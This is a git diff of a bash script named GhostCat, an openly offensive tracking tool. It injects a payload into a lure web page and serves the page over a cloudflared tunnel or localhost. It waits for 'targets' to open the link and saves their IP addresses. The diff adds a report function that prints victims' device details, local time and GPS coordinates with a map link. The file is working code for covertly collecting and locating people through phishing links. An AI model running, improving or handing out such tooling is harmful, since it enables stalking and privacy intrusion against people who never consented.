@@ -1,11 +1,13 @@
+
 #!/bin/bash
-# GhostCat v 0.2
+# GhostCat v0.2
 
 trap 'printf "\n";stop' 2
 
+
 banner() {
 clear
-printf '\n     ██████  ██   ██  █████   ██████ ███████  ██████    ███  ██████ \n'
+printf '\n       ██████  ██   ██  █████   ██████ ███████  ██████    ███  ██████ \n'
 printf '      ██       ██   ██ ██   ██ ██         ██   ██        █   █   ██   \n'
 printf '      ██   ███ ███████ ██   ██  █████     ██   ██        █████   ██   \n'
 printf '      ██    ██ ██   ██ ██   ██      ██    ██   ██    ██  █   █   ██   \n'
@@ -22,56 +24,94 @@ checkcf=$(ps aux | grep -o "cloudflared" | head -n1)
 checkphp=$(ps aux | grep -o "php" | head -n1)
 checkssh=$(ps aux | grep -o "ssh" | head -n1)
 if [[ $checkcf == *'cloudflared'* ]]; then
-    pkill -f -2 cloudflared > /dev/null 2>&1
-    killall -2 cloudflared > /dev/null 2>&1
+pkill -f -2 cloudflared > /dev/null 2>&1
+killall -2 cloudflared > /dev/null 2>&1
 fi
 if [[ $checkphp == *'php'* ]]; then
-    killall -2 php > /dev/null 2>&1
+killall -2 php > /dev/null 2>&1
 fi
 if [[ $checkssh == *'ssh'* ]]; then
-    killall -2 ssh > /dev/null 2>&1
+killall -2 ssh > /dev/null 2>&1
 fi
 exit 1
 }
 
+# Function to catch the IP of the target
 catch_ip() {
-ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
-IFS=$'\n'
-printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
-cat ip.txt >> saved.ip.txt
+    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
+    IFS=$'\n'
+    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+    cat ip.txt >> saved.ip.txt
 }
 
+# Function to continuously check for interaction and call catch_ip()
 checkfound() {
-printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
-while [ true ]; do
-    if [[ -e "ip.txt" ]]; then
-        printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
-        catch_ip
-        rm -rf ip.txt
-        tail -f -n 110 data.txt
-    fi
-    sleep 0.5
-done 
+    printf "\n"
+    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for targets, Press Ctrl + C to exit...\e[0m\n"
+    while [ true ]; do
+        if [[ -e "ip.txt" ]]; then
+            printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
+            catch_ip
+            rm -rf ip.txt
+            tail -f -n 110 data.txt
+        fi
+        sleep 0.5
+    done
 }
 
+# Custom report generation function
+generate_report() {
+    printf "\n--- Information Gathering Report ---\n\n"
+    
+    printf "Device Information\n"
+    printf "----------------------------\n"
+    printf "User Agent: %s\n" "$user_agent"
+    printf "Platform: %s\n" "$platform"
+    printf "Cookies Enabled: %s\n" "$cookies"
+    printf "Browser Language: %s\n" "$browser_lang"
+    printf "Browser: %s\n" "$browser_name"
+    printf "RAM: %s GB\n" "$ram"
+    printf "CPU Cores: %s\n" "$cpu_cores"
+    printf "Screen Resolution: %sx%s\n" "$screen_width" "$screen_height"
+    printf "Local Time: %s\n" "$local_time"
+    printf "\n"
+    
+    if [ ! -z "$lat" ] && [ ! -z "$long" ]; then
+        printf "GPS Coordinates\n"
+        printf "-----------------------\n"
+        printf "Latitude: %s\n" "$lat"
+        printf "Longitude: %s\n" "$long"
+        printf "Map Location: https://www.google.com/maps/place/%s,%s\n" "$lat" "$long"
+        printf "\n"
+    else
+        printf "User denied the Geolocation permission.\n"
+        printf "\n"
+    fi
+    
+    printf "Target IP Details\n"
+    printf "----------------\n"
+    printf "IP: %s\n" "$ip"
+    printf "---------------\n"
+}
+
+# Function to start Cloudflare server and fetch the direct link
 cf_server() {
 if [[ -e cloudflared ]]; then
-    echo "Cloudflared already installed."
+echo "Cloudflared already installed."
 else
-    command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
-    printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared...\n"
-    arch=$(uname -m)
-    arch2=$(uname -a | grep -o 'Android' | head -n1)
-    if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
-        wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1
-    elif [[ "$arch" == *'aarch64'* ]]; then
-        wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1
-    elif [[ "$arch" == *'x86_64'* ]]; then
-        wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
-    else
-        wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared > /dev/null 2>&1 
-    fi
+command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
+printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared...\n"
+arch=$(uname -m)
+arch2=$(uname -a | grep -o 'Android' | head -n1)
+if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
+wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1
+elif [[ "$arch" == *'aarch64'* ]]; then
+wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1
+elif [[ "$arch" == *'x86_64'* ]]; then
+wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
+else
+wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared > /dev/null 2>&1 
+fi
 fi
 chmod +x cloudflared
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
@@ -83,15 +123,16 @@ rm cf.log > /dev/null 2>&1 &
 sleep 10
 link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cf.log")
 if [[ -z "$link" ]]; then
-    printf "\e[1;31m[!] Direct link is not generating \e[0m\n"
-    exit 1
+printf "\e[1;31m[!] Direct link is not generating \e[0m\n"
+exit 1
 else
-    printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
 fi
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 checkfound
 }
 
+# Function to run the local server without Cloudflare
 local_server() {
 sed 's+forwarding_link+''+g' template.php > index.php
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server on Localhost:8080...\n"
@@ -100,25 +141,26 @@ sleep 2
 checkfound
 }
 
+# Main logic to initiate the tool
 ghostcat() {
 if [[ -e data.txt ]]; then
-    cat data.txt >> targetreport.txt
-    rm -rf data.txt
-    touch data.txt
+cat data.txt >> targetreport.txt
+rm -rf data.txt
+touch data.txt
 fi
 if [[ -e ip.txt ]]; then
-    rm -rf ip.txt
+rm -rf ip.txt
 fi
 sed -e '/tc_payload/r payload' index_chat.html > index.html
 default_option_server="Y"
 read -p $'\n\e[1;93m Do you want to use cloudflared tunnel?\n \e[1;92motherwise it will run on localhost:8080 [Default is Y] [Y/N]: \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
 if [[ $option_server == "Y" || $option_server == "y" || $option_server == "Yes" || $option_server == "yes" ]]; then
-    cf_server
-    sleep 1
+cf_server
+sleep 1
 else
-    local_server
-    sleep 1
+local_server
+sleep 1
 fi
 }
 
